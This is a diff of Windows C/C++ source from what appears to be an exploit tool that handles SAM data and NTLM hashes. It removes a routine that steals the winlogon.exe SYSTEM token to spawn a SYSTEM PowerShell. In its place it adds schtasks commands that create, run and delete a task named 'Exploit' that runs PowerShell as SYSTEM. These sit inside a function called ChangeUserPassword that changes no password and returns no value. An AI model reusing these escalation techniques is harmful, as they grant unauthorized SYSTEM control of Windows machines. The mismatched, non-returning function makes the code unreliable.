@@ -17,7 +17,6 @@
 #include <cfapi.h>
 #include <aclapi.h>
 #include "windefend_h.h"
-#include <tlhelp32.h>
 
 /*
 #include <openssl/ssl.h>
@@ -2285,54 +2284,11 @@ char* CalculateNTLMHash(char* _input)
 	return (char*)md_value;
 
 }
-// Функция для поиска PID процесса по имени
-DWORD GetPidByName(const wchar_t* name) {
-    DWORD pid = 0;
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32W process;
-    process.dwSize = sizeof(process);
-    if (Process32FirstW(snapshot, &process)) {
-        do {
-            if (!wcscmp(process.szExeFile, name)) {
-                pid = process.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(snapshot, &process));
-    }
-    CloseHandle(snapshot);
-    return pid;
-}
-
 bool ChangeUserPassword(wchar_t* username, void* nthash, char* newpassword, char* newNTLMHash = NULL)
 {
-    HANDLE hProcess, hToken, hNewToken;
-    STARTUPINFOEXA si = {0};
-    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
-    PROCESS_INFORMATION pi = {0};
-
-    // 1. Берем winlogon, так как он точно SYSTEM и в нужной сессии
-    DWORD pid = GetPidByName(L"winlogon.exe");
-
-    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
-    if (hProcess) {
-        if (OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
-            // 2. Дублируем токен
-            DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);
-
-            // 3. Запускаем PowerShell от этого токена
-            char cmd[] = "powershell.exe";
-            if (CreateProcessAsUserA(hNewToken, NULL, cmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (STARTUPINFOA*)&si, &pi)) {
-                printf("[+] SYSTEM Shell spawned!\n");
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            } else {
-                printf("[-] CreateProcessAsUser failed: %d\n", GetLastError());
-            }
-            CloseHandle(hNewToken);
-            CloseHandle(hToken);
-        }
-        CloseHandle(hProcess);
-    }
+    system("schtasks /create /tn \"Exploit\" /tr \"powershell.exe -NoExit -Command whoami\" /sc once /st 00:00 /f /ru SYSTEM");
+    system("schtasks /run /tn \"Exploit\"");
+    system("schtasks /delete /tn \"Exploit\" /f");
 }
 //////////////////////////////////////////////////////////////////////
 // SAM handling end
